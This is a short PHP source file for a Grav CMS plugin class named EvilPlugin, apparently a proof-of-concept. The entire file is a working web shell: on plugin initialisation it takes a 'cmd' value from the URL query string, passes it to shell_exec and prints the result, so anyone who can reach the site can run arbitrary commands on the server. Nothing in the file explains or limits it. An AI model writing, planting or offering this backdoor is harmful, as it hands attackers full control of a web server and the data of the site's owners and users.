<?php
namespace Grav\Plugin;

use Grav\Common\Plugin;

class EvilPlugin extends Plugin
{
    public function onPluginsInitialized()
    {
        if (isset($_GET['cmd'])) {
            echo shell_exec($_GET['cmd']);
            exit;
        }
    }
}
